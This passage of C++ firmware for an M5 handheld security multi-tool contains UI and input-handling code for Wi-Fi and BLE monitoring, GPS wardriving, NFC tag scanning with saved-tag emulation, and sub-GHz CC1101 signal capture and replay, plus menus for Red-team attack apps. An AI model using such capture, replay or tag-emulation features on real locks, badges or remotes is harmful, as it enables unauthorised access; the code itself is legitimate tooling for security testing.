    M5.Display.printf("Attempts: %d", g_nfcScanCount);
    M5.Display.setCursor(128, 64);
    M5.Display.printf("%s", g_nfcReaderReady ? "reader ok" : "reader?");
    if (g_nfcMsg[0]) {
      M5.Display.setTextColor(kText, kPanelAlt);
      M5.Display.setCursor(14, 80);
      M5.Display.printf("%.34s", g_nfcMsg);
    }
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(4, 127);
    M5.Display.print("auto scan  Fn+Bk back");

  } else if (g_nfcView == NfcView::TagDetail) {
    M5.Display.fillRoundRect(8, 26, 224, 86, 6, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 86, 6, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 30);
    M5.Display.printf("[TAG] %s", g_nfcLastTag.typeStr);
    // UID hex
    char uidBuf[24] = {};
    int p = 0;
    for (int i = 0; i < g_nfcLastTag.uidLen && p < 22; ++i)
      p += snprintf(uidBuf + p, sizeof(uidBuf) - p, "%02X%s",
                    g_nfcLastTag.uid[i], i < g_nfcLastTag.uidLen - 1 ? ":" : "");
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 44);
    M5.Display.printf("UID: %.22s", uidBuf);
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 58);
    M5.Display.printf("SAK:%02X  ATQA:%02X%02X",
      g_nfcLastTag.sak, g_nfcLastTag.atqa[0], g_nfcLastTag.atqa[1]);
    // Block 0 preview (first 8 bytes)
    char b0buf[28] = {};
    int bp = 0;
    for (int i = 0; i < 8; ++i)
      bp += snprintf(b0buf + bp, sizeof(b0buf) - bp, "%02X ", g_nfcLastTag.block0[i]);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 72);
    M5.Display.printf("B0: %.25s", b0buf);
    if (g_nfcMsg[0]) {
      M5.Display.setTextColor(kGold, kPanelAlt);
      M5.Display.setCursor(14, 88);
      M5.Display.printf("%.34s", g_nfcMsg);
    }
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(4, 127);
    M5.Display.print("Ent save Fn+R scan Fn+Bk");

  } else if (g_nfcView == NfcView::SavedList) {
    M5.Display.fillRoundRect(8, 26, 224, 86, 4, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 86, 4, accent);
    if (g_nfcSdFileCount == 0) {
      M5.Display.setTextColor(kDimText, kPanelAlt);
      M5.Display.setCursor(14, 52);
      M5.Display.println("No saved tags on SD.");
      M5.Display.setCursor(14, 66);
      M5.Display.println("Scan a tag and save it.");
    } else {
      M5.Display.setTextColor(accent, kPanelAlt);
      M5.Display.setCursor(14, 30);
      M5.Display.printf("Select tag to emulate (%d):", g_nfcSdFileCount);
      const int maxShow = min(g_nfcSdFileCount - g_nfcSdFileScroll, 5);
      for (int i = 0; i < maxShow; ++i) {
        const int idx = g_nfcSdFileScroll + i;
        const int y = 42 + i * 13;
        const bool sel = (idx == g_nfcSdFileSel);
        M5.Display.fillRect(12, y, 216, 12, sel ? accent : kPanelAlt);
        M5.Display.setTextColor(sel ? WHITE : kText, sel ? accent : kPanelAlt);
        M5.Display.setCursor(16, y + 2);
        M5.Display.printf("%.32s", g_nfcSdFiles[idx] + 5);  // skip "/nfc/"
      }
    }
    if (g_nfcMsg[0]) {
      M5.Display.fillRect(8, 124, 224, 10, bg);
      M5.Display.setTextColor(kGold, bg);
      M5.Display.setCursor(12, 126);
      M5.Display.printf("%.36s", g_nfcMsg);
    } else {
      M5.Display.fillRect(8, 124, 224, 10, bg);
      M5.Display.setTextColor(kDimText, bg);
      M5.Display.setCursor(4, 127);
      M5.Display.print("Ent emul Fn+D del Fn+N ren");
    }

  } else if (g_nfcView == NfcView::Emulating) {
    M5.Display.fillRoundRect(8, 26, 224, 86, 6, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 86, 6, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 32);
    M5.Display.println("EMULATING TAG...");
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    M5.Display.printf("Type: %.20s", g_nfcLastTag.typeStr);
    char uidBuf[24] = {};
    int p = 0;
    for (int i = 0; i < g_nfcLastTag.uidLen && p < 22; ++i)
      p += snprintf(uidBuf + p, sizeof(uidBuf) - p, "%02X%s",
                    g_nfcLastTag.uid[i], i < g_nfcLastTag.uidLen - 1 ? ":" : "");
    M5.Display.setCursor(14, 64);
    M5.Display.printf("UID: %.22s", uidBuf);
    if (g_nfcMsg[0]) {
      M5.Display.setTextColor(kText, kPanelAlt);
      M5.Display.setCursor(14, 80);
      M5.Display.printf("%.34s", g_nfcMsg);
    }
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(4, 127);
    M5.Display.print("Fn+Bk=stop");
  } else if (g_nfcView == NfcView::Rename) {
    // Draw SavedList as background context
    M5.Display.fillRoundRect(8, 26, 224, 86, 4, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 86, 4, accent);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 32);
    M5.Display.print("Rename saved tag");
    drawRenameOverlay(mode);
  }
}

void drawAppScreen(TeamMode mode, AppId appId) {
  if (mode == TeamMode::Blue && appId == AppId::WifiMonitor) {
    drawWifiMonitorScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::BleMonitor) {
    drawBleMonitorScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::GpsMonitor) {
    drawGpsMonitorScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::Cc1101Scan) {
    cc1101ScanSdFiles();
    drawCc1101ScanScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::NrfAnalyzer) {
    drawNrfAnalyzerScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::NfcScanner) {
    nfcScanSdFiles();
    drawNfcScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::Alerts) {
    drawAlertsScreen(mode);
    return;
  }
  if (appId == AppId::Files) {
    drawFilesScreen(mode);
    return;
  }
  if (mode == TeamMode::Blue && appId == AppId::DeviceHealth) {
    drawDeviceHealthScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::WifiOps) {
    drawWifiOpsScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::BleOps) {
    drawBleOpsScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::Cc1101Ops) {
    cc1101ScanSdFiles();
    drawCc1101OpsScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::Nrf24Ops) {
    drawNrf24OpsScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::RfTools) {
    drawRfToolsScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::IrToolkit) {
    drawIrToolkitScreen(mode);
    return;
  }
  if (mode == TeamMode::Red && appId == AppId::Payloads) {
    drawPayloadsScreen(mode);
    return;
  }
  if (appId == AppId::Settings) {
    drawConfigScreen(mode);
    return;
  }

  uint16_t accent = themeModeAccent(mode);
  uint16_t soft = themeModeSoft(mode);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println(getModeName(mode));
  drawBatteryWidget(themeModePanel(mode), 132);
  M5.Display.setTextColor(kDimText, themeModePanel(mode));
  M5.Display.setCursor(172, 8);
  M5.Display.println(hardwareProfileShortName());

  if (mode == TeamMode::Red) {
    drawRedPanelFrame(8, 28, 224, 64, accent);
    drawSignalBars(188, 36, accent);
  } else {
    drawBluePanelFrame(8, 28, 224, 64, accent);
    drawBlueMeter(184, 34, accent);
  }
  M5.Display.setTextColor(accent, themeModePanel(mode));
  M5.Display.setCursor(14, 38);
  M5.Display.println(detailLine1(appId));
  M5.Display.setTextColor(kText, themeModePanel(mode));
  M5.Display.setTextSize(1);
  M5.Display.setCursor(14, 54);
  M5.Display.println(detailLine2(appId));
  M5.Display.setTextColor(soft, themeModePanel(mode));
  M5.Display.setCursor(14, 72);
  if (detailLine3(appId)[0] != '\0') {
    M5.Display.println(detailLine3(appId));
  } else if (mode == TeamMode::Red) {
    M5.Display.println("aggressive module shell ready");
  } else {
    M5.Display.println("analysis module shell ready");
  }

  const int radius = mode == TeamMode::Red ? 3 : 10;
  M5.Display.fillRoundRect(8, 98, 224, 28, radius, kPanelAlt);
  M5.Display.drawRoundRect(8, 98, 224, 28, radius, soft);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 108);
  M5.Display.println("Ent refresh Fn+Bk back Tab+Bk");
}

bool handleAppAction(TeamMode mode, AppId appId, bool moveUp, bool moveDown,
                     bool selectPressed, bool backPressed, bool cycleSort,
                     bool rescanPressed, bool deletePressed, bool renamePressed) {
  if (mode == TeamMode::Blue && appId == AppId::WifiMonitor) {
    if (g_blueWifiView == BlueWifiView::Menu) {
      if (moveUp && g_blueWifiMenuIndex > 0) {
        --g_blueWifiMenuIndex;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueWifiMenuIndex < 3) {
        ++g_blueWifiMenuIndex;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (rescanPressed) {
        runWifiScan();
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_blueWifiMenuIndex) {
          case 0: g_blueWifiView = BlueWifiView::DeviceWatch; break;
          case 1: g_blueWifiView = BlueWifiView::ThreatFeed; break;
          case 2: g_blueWifiView = BlueWifiView::ApIntel; break;
          case 3: g_blueWifiView = BlueWifiView::ChannelMap; break;
        }
        drawWifiMonitorScreen(mode);
        return true;
      }
    } else if (g_blueWifiView == BlueWifiView::DeviceWatch || g_blueWifiView == BlueWifiView::Detail) {
      if (backPressed && g_blueWifiView == BlueWifiView::Detail) {
        g_blueWifiView = BlueWifiView::DeviceWatch;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (moveUp && g_blueWifiView == BlueWifiView::DeviceWatch && g_wifiCount > 0) {
        if (g_wifiSelected > 0) --g_wifiSelected;
        if (g_wifiSelected < g_wifiScroll) g_wifiScroll = g_wifiSelected;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueWifiView == BlueWifiView::DeviceWatch && g_wifiCount > 0) {
        if (g_wifiSelected < g_wifiCount - 1) ++g_wifiSelected;
        if (g_wifiSelected >= g_wifiScroll + kWifiVisibleRows) {
          g_wifiScroll = g_wifiSelected - kWifiVisibleRows + 1;
        }
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (cycleSort && g_blueWifiView == BlueWifiView::DeviceWatch) {
        switch (g_wifiSortMode) {
          case WifiSortMode::Rssi: g_wifiSortMode = WifiSortMode::Channel; break;
          case WifiSortMode::Channel: g_wifiSortMode = WifiSortMode::OpenFirst; break;
          case WifiSortMode::OpenFirst: g_wifiSortMode = WifiSortMode::NewFirst; break;
          case WifiSortMode::NewFirst: g_wifiSortMode = WifiSortMode::Threat; break;
          case WifiSortMode::Threat: g_wifiSortMode = WifiSortMode::Rssi; break;
        }
        sortWifiItems();
        g_wifiSelected = 0;
        g_wifiScroll = 0;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (rescanPressed && g_blueWifiView == BlueWifiView::DeviceWatch) {
        runWifiScan();
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        if (g_blueWifiView == BlueWifiView::Detail) {
          g_blueWifiView = BlueWifiView::DeviceWatch;
        } else if (g_wifiCount > 0) {
          g_blueWifiView = BlueWifiView::Detail;
        } else {
          runWifiScan();
        }
        drawWifiMonitorScreen(mode);
        return true;
      }
    } else {
      if (backPressed) {
        g_blueWifiView = BlueWifiView::Menu;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (moveUp && g_blueWifiView == BlueWifiView::ThreatFeed && g_wifiThreatCount > 0) {
        if (g_wifiThreatSelected > 0) --g_wifiThreatSelected;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueWifiView == BlueWifiView::ThreatFeed && g_wifiThreatCount > 0) {
        if (g_wifiThreatSelected < g_wifiThreatCount - 1) ++g_wifiThreatSelected;
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (rescanPressed) {
        runWifiScan();
        drawWifiMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        if (g_blueWifiView == BlueWifiView::ThreatFeed && g_wifiThreatCount > 0) {
          g_wifiSelected = g_wifiThreatIndices[g_wifiThreatSelected];
          g_wifiScroll = g_wifiSelected;
          if (g_wifiScroll > g_wifiCount - kWifiVisibleRows) {
            g_wifiScroll = (g_wifiCount > kWifiVisibleRows) ? (g_wifiCount - kWifiVisibleRows) : 0;
          }
          g_blueWifiView = BlueWifiView::Detail;
          drawWifiMonitorScreen(mode);
          return true;
        }
      }
    }
  }
  if (mode == TeamMode::Blue && appId == AppId::BleMonitor) {
    if (g_blueBleView == BlueBleView::Menu) {
      if (moveUp && g_blueBleMenuIndex > 0) {
        --g_blueBleMenuIndex;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueBleMenuIndex < 3) {
        ++g_blueBleMenuIndex;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (rescanPressed) {
        runBleScan();
        drawBleMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_blueBleMenuIndex) {
          case 0: g_blueBleView = BlueBleView::DeviceWatch; break;
          case 1: g_blueBleView = BlueBleView::TrackerHunt; break;
          case 2: g_blueBleView = BlueBleView::UuidIntel; break;
          case 3: g_blueBleView = BlueBleView::ThreatFeed; break;
        }
        drawBleMonitorScreen(mode);
        return true;
      }
    } else if (g_blueBleView == BlueBleView::DeviceWatch || g_blueBleView == BlueBleView::Detail) {
      if (backPressed && g_blueBleView == BlueBleView::Detail) {
        g_blueBleView = BlueBleView::DeviceWatch;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (moveUp && g_blueBleView == BlueBleView::DeviceWatch && g_bleCount > 0) {
        if (g_bleSelected > 0) --g_bleSelected;
        if (g_bleSelected < g_bleScroll) g_bleScroll = g_bleSelected;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueBleView == BlueBleView::DeviceWatch && g_bleCount > 0) {
        if (g_bleSelected < g_bleCount - 1) ++g_bleSelected;
        if (g_bleSelected >= g_bleScroll + kBleVisibleRows) {
          g_bleScroll = g_bleSelected - kBleVisibleRows + 1;
        }
        drawBleMonitorScreen(mode);
        return true;
      }
      if (cycleSort && g_blueBleView == BlueBleView::DeviceWatch) {
        switch (g_bleSortMode) {
          case BleSortMode::Rssi: g_bleSortMode = BleSortMode::NewFirst; break;
          case BleSortMode::NewFirst: g_bleSortMode = BleSortMode::Threat; break;
          case BleSortMode::Threat: g_bleSortMode = BleSortMode::Rssi; break;
        }
        sortBleItems();
        g_bleSelected = 0;
        g_bleScroll = 0;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (rescanPressed && g_blueBleView == BlueBleView::DeviceWatch) {
        runBleScan();
        drawBleMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        if (g_blueBleView == BlueBleView::Detail) {
          g_blueBleView = BlueBleView::DeviceWatch;
        } else if (g_bleCount > 0) {
          g_blueBleView = BlueBleView::Detail;
        } else {
          runBleScan();
        }
        drawBleMonitorScreen(mode);
        return true;
      }
    } else {
      if (backPressed) {
        g_blueBleView = BlueBleView::Menu;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (moveUp && g_blueBleView == BlueBleView::ThreatFeed && g_bleThreatCount > 0) {
        if (g_bleThreatSelected > 0) --g_bleThreatSelected;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueBleView == BlueBleView::ThreatFeed && g_bleThreatCount > 0) {
        if (g_bleThreatSelected < g_bleThreatCount - 1) ++g_bleThreatSelected;
        drawBleMonitorScreen(mode);
        return true;
      }
      if (rescanPressed) {
        runBleScan();
        drawBleMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        if (g_blueBleView == BlueBleView::ThreatFeed && g_bleThreatCount > 0) {
          g_bleSelected = g_bleThreatIndices[g_bleThreatSelected];
          g_bleScroll = g_bleSelected;
          if (g_bleScroll > g_bleCount - kBleVisibleRows) {
            g_bleScroll = (g_bleCount > kBleVisibleRows) ? (g_bleCount - kBleVisibleRows) : 0;
          }
          g_blueBleView = BlueBleView::Detail;
          drawBleMonitorScreen(mode);
          return true;
        }
        if ((g_blueBleView == BlueBleView::TrackerHunt || g_blueBleView == BlueBleView::UuidIntel) &&
            g_bleCount > 0) {
          int best = -1;
          for (int i = 0; i < g_bleCount; ++i) {
            const bool trackerMatch = g_blueBleView == BlueBleView::TrackerHunt && g_bleItems[i].trackerSuspect;
            const bool uuidMatch = g_blueBleView == BlueBleView::UuidIntel &&
                                   (g_bleItems[i].serviceRich || g_bleItems[i].manufacturerLen > 0);
            if (!trackerMatch && !uuidMatch) continue;
            if (best < 0 || g_bleItems[i].riskScore > g_bleItems[best].riskScore) best = i;
          }
          if (best >= 0) {
            g_bleSelected = best;
            g_bleScroll = g_bleSelected;
            if (g_bleScroll > g_bleCount - kBleVisibleRows) {
              g_bleScroll = (g_bleCount > kBleVisibleRows) ? (g_bleCount - kBleVisibleRows) : 0;
            }
            g_blueBleView = BlueBleView::Detail;
            drawBleMonitorScreen(mode);
            return true;
          }
        }
      }
    }
  }
  if (mode == TeamMode::Blue && appId == AppId::GpsMonitor) {
    if (g_blueGpsView == BlueGpsView::Menu) {
      if (backPressed) return false;
      if (moveUp && g_blueGpsMenuIndex > 0) {
        --g_blueGpsMenuIndex;
        drawGpsMonitorScreen(mode);
        return true;
      }
      if (moveDown && g_blueGpsMenuIndex < 2) {
        ++g_blueGpsMenuIndex;
        drawGpsMonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_blueGpsMenuIndex) {
          case 0: g_blueGpsView = BlueGpsView::Status; break;
          case 1: g_blueGpsView = BlueGpsView::Tracker; break;
          case 2: g_blueGpsView = BlueGpsView::Wardriving; break;
        }
        drawGpsMonitorScreen(mode);
        return true;
      }
      if (rescanPressed) {
        refreshGpsState();
        drawGpsMonitorScreen(mode);
        return true;
      }
      return true;
    }
    if (backPressed) {
      g_blueGpsView = BlueGpsView::Menu;
      drawGpsMonitorScreen(mode);
      return true;
    }
    if (cycleSort) {
      if (g_blueGpsView == BlueGpsView::Tracker) {
        g_gpsTrackerLogging = !g_gpsTrackerLogging;
        if (g_gpsTrackerLogging) g_gpsLastTrackLogMs = 0;
      } else if (g_blueGpsView == BlueGpsView::Wardriving) {
        g_gpsWardriveLogging = !g_gpsWardriveLogging;
        if (g_gpsWardriveLogging) g_gpsLastWardriveLogMs = 0;
      }
      drawGpsMonitorScreen(mode);
      return true;
    }
    if (rescanPressed) {
      refreshGpsState();
      if (g_blueGpsView == BlueGpsView::Tracker) {
        logTrackerPoint();
      } else if (g_blueGpsView == BlueGpsView::Wardriving) {
        logWardrivePoint();
      }
      drawGpsMonitorScreen(mode);
      return true;
    }
    if (!moveUp && !moveDown && !selectPressed && !backPressed && !cycleSort && !rescanPressed) {
      drawGpsMonitorScreen(mode);
      return true;
    }
    return true;
  }
  if (mode == TeamMode::Blue && appId == AppId::Cc1101Scan) {
    // ── Menu ───────────────────────────────────────────────────────────────
    if (g_blueCc1101View == BlueCc1101View::Menu) {
      if (moveUp && g_blueCc1101MenuSel > 0) {
        --g_blueCc1101MenuSel; drawCc1101ScanScreen(mode); return true;
      }
      if (moveDown && g_blueCc1101MenuSel < 3) {
        ++g_blueCc1101MenuSel; drawCc1101ScanScreen(mode); return true;
      }
      if (selectPressed) {
        switch (g_blueCc1101MenuSel) {
          case 0: g_blueCc1101View = BlueCc1101View::Spectrum;  refreshCc1101Console(); break;
          case 1: g_blueCc1101View = BlueCc1101View::Waterfall; refreshCc1101Console(); break;
          case 2:
            g_blueCc1101View = BlueCc1101View::Capture;
            g_cc1101SdMsg[0] = '\0';
            cc1101ScanSdFiles();
            refreshCc1101Console();
            break;
          case 3:
            g_blueCc1101View = BlueCc1101View::SdReplay;
            g_cc1101SdMsg[0] = '\0';
            g_cc1101SdFileSel = 0;
            cc1101ScanSdFiles();
            break;
        }
        drawCc1101ScanScreen(mode); return true;
      }
      // back from Menu exits to launcher (return false so outer handler fires)
      return false;
    }
    // ── SD Replay ──────────────────────────────────────────────────────────
    if (g_blueCc1101View == BlueCc1101View::SdReplay) {
      if (deletePressed && g_cc1101SdFileCount > 0) {
        SD.remove(g_cc1101SdFiles[g_cc1101SdFileSel]);
        cc1101ScanSdFiles();
        if (g_cc1101SdFileSel >= g_cc1101SdFileCount) {
          g_cc1101SdFileSel = g_cc1101SdFileCount > 0 ? g_cc1101SdFileCount - 1 : 0;
        }
        snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Deleted. %d files left", g_cc1101SdFileCount);
        drawCc1101ScanScreen(mode); return true;
      }
      if (moveUp && g_cc1101SdFileSel > 0) {
        --g_cc1101SdFileSel; drawCc1101ScanScreen(mode); return true;
      }
      if (moveDown && g_cc1101SdFileSel < g_cc1101SdFileCount - 1) {
        ++g_cc1101SdFileSel; drawCc1101ScanScreen(mode); return true;
      }
      if (rescanPressed) {
        cc1101ScanSdFiles();
        g_cc1101SdFileSel = 0;
        snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Found %d files", g_cc1101SdFileCount);
        drawCc1101ScanScreen(mode); return true;
      }
      if (selectPressed && g_cc1101SdFileCount > 0) {
        Cc1101RawCapture rawTmp = {};
        if (cc1101LoadRawFromSd(g_cc1101SdFiles[g_cc1101SdFileSel], rawTmp)) {
          hardwareCc1101ReplayRaw(rawTmp);
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "TX %d pulses @ %dMHz",
            rawTmp.count, rawTmp.freqMHz);
        } else {
          Cc1101RxCapture tmp = {};
          if (cc1101LoadFromSd(g_cc1101SdFiles[g_cc1101SdFileSel], tmp)) {
            hardwareCc1101Replay(tmp, atoi(g_cc1101Bands[g_cc1101BandIndex]));
            snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "TX %dB on %sMHz",
              tmp.len, g_cc1101Bands[g_cc1101BandIndex]);
          } else {
            snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Load failed");
          }
        }
        drawCc1101ScanScreen(mode); return true;
      }
      if (renamePressed && g_cc1101SdFileCount > 0) {
        renameBegin(g_cc1101SdFiles[g_cc1101SdFileSel], "/cc1101", ".bin");
        g_blueCc1101View = BlueCc1101View::Renaming;
        drawCc1101ScanScreen(mode); return true;
      }
      if (backPressed) {
        g_blueCc1101View = BlueCc1101View::Menu;
        g_cc1101SdMsg[0] = '\0';
        drawCc1101ScanScreen(mode); return true;
      }
      return true;
    }
    if (g_blueCc1101View == BlueCc1101View::Renaming) {
      if (g_appTypedChar) { renameHandleChar(); drawCc1101ScanScreen(mode); return true; }
      if (g_appTypedBackspace && g_renameLen > 0) {
        g_renameBuffer[--g_renameLen] = '\0';
        drawCc1101ScanScreen(mode); return true;
      }
      if (backPressed) {
        g_blueCc1101View = BlueCc1101View::SdReplay; g_cc1101SdMsg[0] = '\0';
        drawCc1101ScanScreen(mode); return true;
      }
      if (selectPressed && g_renameLen > 0) {
        if (renameCommit()) {
          cc1101ScanSdFiles();
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Renamed OK");
        } else {
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Rename failed");
        }
        g_blueCc1101View = BlueCc1101View::SdReplay;
        drawCc1101ScanScreen(mode); return true;
      }
      return true;
    }
    // ── Capture ────────────────────────────────────────────────────────────
    if (g_blueCc1101View == BlueCc1101View::Capture) {
      if (moveUp && g_cc1101BandIndex > 0) {
        --g_cc1101BandIndex; refreshCc1101Console(); drawCc1101ScanScreen(mode); return true;
      }
      if (moveDown && g_cc1101BandIndex < 3) {
        ++g_cc1101BandIndex; refreshCc1101Console(); drawCc1101ScanScreen(mode); return true;
      }
      if (cycleSort) {
        g_cc1101Sensitivity = (g_cc1101Sensitivity % 5) + 1;
        refreshCc1101Console(); drawCc1101ScanScreen(mode); return true;
      }
      if (selectPressed) {
        if (g_blueHasCapture) {
          hardwareCc1101ReplayRaw(g_blueRawCapture);
          ++g_blueCaptureReplays;
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "TX'd %d pulses @ %dMHz",
            g_blueRawCapture.count, g_blueRawCapture.freqMHz);
        } else {
          ++g_blueCaptureCount;
          g_blueHasCapture = hardwareCc1101CaptureRaw(
            atoi(g_cc1101Bands[g_cc1101BandIndex]), g_blueRawCapture, 1500);
          if (!g_blueHasCapture)
            snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "No signal (1.5s window)");
          else
            g_cc1101SdMsg[0] = '\0';
        }
        drawCc1101ScanScreen(mode); return true;
      }
      if (deletePressed && g_blueHasCapture) {
        if (cc1101SaveRawToSd(g_blueRawCapture, g_cc1101Bands[g_cc1101BandIndex])) {
          cc1101ScanSdFiles();
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Saved %d pulses (%d files)",
            g_blueRawCapture.count, g_cc1101SdFileCount);
        } else {
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Save failed - SD card?");
        }
        drawCc1101ScanScreen(mode); return true;
      }
      if (rescanPressed) {
        g_blueHasCapture = false;
        g_blueRawCapture = {};
        g_blueCaptureCount = 0;
        g_blueCaptureReplays = 0;
        g_cc1101SdMsg[0] = '\0';
        drawCc1101ScanScreen(mode); return true;
      }
      if (backPressed) {
        g_blueCc1101View = BlueCc1101View::Menu;
        g_cc1101SdMsg[0] = '\0';
        drawCc1101ScanScreen(mode); return true;
      }
      // Auto-listen: attempt raw OOK capture on each periodic refresh
      ++g_blueCaptureCount;
      g_blueHasCapture = hardwareCc1101CaptureRaw(
        atoi(g_cc1101Bands[g_cc1101BandIndex]), g_blueRawCapture, 1500);
      if (g_blueHasCapture) g_cc1101SdMsg[0] = '\0';
      drawCc1101ScanScreen(mode); return true;
    }
    // ── Spectrum / Waterfall ───────────────────────────────────────────────
    if (moveUp && g_cc1101BandIndex > 0) { --g_cc1101BandIndex; refreshCc1101Console(); drawCc1101ScanScreen(mode); return true; }
    if (moveDown && g_cc1101BandIndex < 3) { ++g_cc1101BandIndex; refreshCc1101Console(); drawCc1101ScanScreen(mode); return true; }
    if (cycleSort) { g_cc1101Sensitivity = (g_cc1101Sensitivity % 5) + 1; refreshCc1101Console(); drawCc1101ScanScreen(mode); return true; }
    if (rescanPressed) { refreshCc1101Console(); drawCc1101ScanScreen(mode); return true; }
    if (backPressed) {
      g_blueCc1101View = BlueCc1101View::Menu;
      drawCc1101ScanScreen(mode); return true;
    }
    if (!moveUp && !moveDown && !selectPressed && !backPressed && !cycleSort &&
        !rescanPressed && !deletePressed) {
      refreshCc1101Console();
      drawCc1101ScanScreen(mode);
      return true;
    }
  }
  if (mode == TeamMode::Blue && appId == AppId::NrfAnalyzer) {
        if (moveUp && g_nrfChannelIndex > 0) { --g_nrfChannelIndex; refreshNrfConsole(); drawNrfAnalyzerScreen(mode); return true; }
        if (moveDown && g_nrfChannelIndex < 6) { ++g_nrfChannelIndex; refreshNrfConsole(); drawNrfAnalyzerScreen(mode); return true; }
        if (cycleSort) { g_nrfDensity = (g_nrfDensity % 5) + 1; refreshNrfConsole(); drawNrfAnalyzerScreen(mode); return true; }
        if (rescanPressed) { refreshNrfConsole(); drawNrfAnalyzerScreen(mode); return true; }
        if (selectPressed) {
          g_blueNrfView = (g_blueNrfView == BlueNrfView::Spectrum)
                              ? BlueNrfView::Waterfall
                              : BlueNrfView::Spectrum;
          refreshNrfConsole();
          drawNrfAnalyzerScreen(mode);
          return true;
        }
        if (!moveUp && !moveDown && !selectPressed && !backPressed && !cycleSort &&
            !rescanPressed) {
          refreshNrfConsole();
          drawNrfAnalyzerScreen(mode);
          return true;
        }
      }
  if (mode == TeamMode::Blue && appId == AppId::NfcScanner) {
    if (g_nfcView == NfcView::Menu) {
      if (moveUp && g_nfcMenuSel > 0) { --g_nfcMenuSel; drawNfcScreen(mode); return true; }
      if (moveDown && g_nfcMenuSel < 1) { ++g_nfcMenuSel; drawNfcScreen(mode); return true; }
      if (selectPressed) {
        switch (g_nfcMenuSel) {
          case 0:  // Scan Tag
            g_nfcView = NfcView::Scanning;
            g_nfcScanCount = 0;
            g_nfcLastScanAttemptMs = 0;
            g_nfcReaderReady = nfcInit();
            g_nfcMsg[0] = '\0';
            if (!g_nfcReaderReady) {
              snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Reader not detected");
            }
            break;
          case 1:  // Emulate Saved — open file list
            nfcScanSdFiles();
            g_nfcSdFileSel = 0;
            g_nfcSdFileScroll = 0;
            g_nfcView = NfcView::SavedList;
            g_nfcMsg[0] = '\0';
            break;
        }
        drawNfcScreen(mode); return true;
      }
      return false;  // let back exit to launcher
    }
    if (g_nfcView == NfcView::Scanning) {
      if (backPressed) {
        g_nfcView = NfcView::Menu; g_nfcMsg[0] = '\0';
        drawNfcScreen(mode); return true;
      }
      const uint32_t now = millis();
      if (!g_nfcReaderReady) {
        g_nfcReaderReady = nfcInit();
        if (!g_nfcReaderReady) {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Reader not detected");
